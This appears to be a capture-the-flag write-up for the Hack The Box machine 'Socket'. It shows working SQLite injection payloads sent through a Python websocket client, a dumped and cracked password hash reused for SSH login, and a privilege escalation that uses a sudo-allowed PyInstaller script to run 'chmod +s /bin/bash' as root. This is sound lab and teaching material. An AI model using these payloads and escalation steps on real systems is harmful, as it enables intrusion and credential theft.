# Socket

![logo](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Socket/Socket.png)

## nmap
    
    ```
    PORT     STATE SERVICE REASON  VERSION
    22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
    |   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
    80/tcp   open  http    syn-ack Apache httpd 2.4.52
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    |_http-title: Did not follow redirect to http://qreader.htb/
    | http-methods:
    |_  Supported Methods: GET OPTIONS
    5789/tcp open  unknown syn-ack
    | fingerprint-strings:
    |   GenericLines, GetRequest, HTTPOptions:
    |     HTTP/1.1 400 Bad Request
    |     Date: Sun, 26 Mar 2023 11:51:09 GMT
    |     Server: Python/3.10 websockets/10.4
    |     Content-Length: 77
    |     Content-Type: text/plain
    |     Connection: close
    |     Failed to open a WebSocket connection: did not receive a valid HTTP request.
    |   Help, SSLSessionReq:
    |     HTTP/1.1 400 Bad Request
    |     Date: Sun, 26 Mar 2023 11:51:27 GMT
    |     Server: Python/3.10 websockets/10.4
    |     Content-Length: 77
    |     Content-Type: text/plain
    |     Connection: close
    |     Failed to open a WebSocket connection: did not receive a valid HTTP request.
    |   RTSPRequest:
    |     HTTP/1.1 400 Bad Request
    |     Date: Sun, 26 Mar 2023 11:51:12 GMT
    |     Server: Python/3.10 websockets/10.4
    |     Content-Length: 77
    |     Content-Type: text/plain
    |     Connection: close
    |_    Failed to open a WebSocket connection: did not receive a valid HTTP request.
    ```
    

Dowload the linux zip file from the side. 

We can use this tools to get a python file from the binary.

(this works only with python3.8! To install uncompyle6 is a pit of pain)

```
# Convert App to pyc
pyi-archive_viewer qreader
? X qreader
to filename? ./qreader.pyc

# Decompyle pyc using uncompyle
uncompyle6 qreader.pyc > qreader.py
```

Source code:

```python
<SNIP>
s_host = 'ws://ws.qreader.htb:5789'
<SNIP>
    def version(self):
        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
        if 'error' not in data.keys():
            version_info = data['message']
            msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''
            self.statusBar().showMessage(msg)
            return None
        error = None['error']
        self.statusBar().showMessage(error)
<SNIP>
```

We see, the websocket get an version paramter. We can use the expiren

# SQL Injcetion - sqlite

- *backend code*
    
    ```python
    def version(app_version):
    
        data = fetch_db(f'SELECT * from versions where version = "{app_version}"')
    
        if len(data) == 0:
            return False, f'Invalid version!'
    
        version_info = {}
    
        for row in data:
            for k in row.keys():
                version_info[k] = row[k]
    
        return True, version_info
    ```
    

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/SQLite Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

```python
#!/usr/bin/python3
from websocket import create_connection
import sys, json
ws_host = 'ws://ws.qreader.htb:5789'
VERSION = sys.argv[1]
ws = create_connection(ws_host + '/version')
ws.send(json.dumps({'version': VERSION}))
result = ws.recv()
print(result)
ws.close()
```

- `./ws_cli.py "1\" or 1=1 -- -"`
    - {"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}

## Union Select

- `./ws_cli.py "1\" union select 1,(sqlite_version()),3,4-- -"`
    - {"message": {"id": 1, "version": "3.37.2", "released_date": 3, "downloads": 4}}

```python
#!/usr/bin/python3
from websocket import create_connection
import sys, json
ws_host = 'ws://ws.qreader.htb:5789'
VERSION = sys.argv[1]
ws = create_connection(ws_host + '/version')
union = f"1\" union select 1,({VERSION}),3,4-- -"
ws.send(json.dumps({'version': union}))
result = ws.recv()
try:
    json_object = json.loads(result)
    print(json_object['message']['version'])
except:
    print(result)
ws.close()
```

- `./ws_cli.py "SELECT group_concat(name) FROM sqlite_schema"`
    - sqlite_sequence,versions,users,info,reports,answers
- `./ws_cli.py "SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'"`
    - CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password DATE, role TEXT)

So there is a table `users` with `username` and `password`

- `./ws_cli.py "select username from users"`

admin

- `./ws_cli.py "select password from users"`

0c090c365fa0559b151a43e0fea39710

Crack password: [https://crackstation.net/](https://crackstation.net/)

PW: denjanjade122566

The username is not admin for the SSH login so check the `answers` table.

- `./ws_cli.py "SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='answers'"`
    - CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT,  answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))
- `./ws_cli.py "select answer from answers"`

```
Hello Json,
As if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.
Thomas Keller
```

So we try the username `tkeller` with the password from the `admin`

- `ssh tkeller@qreader.htb`

uid=1001(tkeller) gid=1001(tkeller) groups=1001(tkeller),1002(shared)

→ user.txt

# Priv Esc

- `sudo -l`

```
User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
```

- ls -la /usr/local/sbin/build-installer.sh
-rwxr-xr-x 1 root root 1096 Feb 17 11:41 /usr/local/sbin/build-installer.sh

```bash
#!/bin/bash
if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
  /usr/bin/echo "No enough arguments supplied"
  exit 1;
fi

action=$1
name=$2
ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')

if [[ -L $name ]];then
  /usr/bin/echo 'Symlinks are not allowed'
  exit 1;
fi

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'make' ]]; then
  if [[ $ext == 'py' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
   /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'cleanup' ]]; then
  /usr/bin/rm -r ./build ./dist 2>/dev/null
  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
  /usr/bin/rm /tmp/qreader* 2>/dev/null
else
  /usr/bin/echo 'Invalid action'
  exit 1;
fi
```

We see, we can run `/home/svc/.local/bin/pyinstaller <any .spec file>`

So crate this file

```python
import os
os.system("chmod +s /bin/bash")
```

- `sudo /usr/local/sbin/build-installer.sh build /dev/shm/run.spec`

The root run the code in this file!

→ root.txt
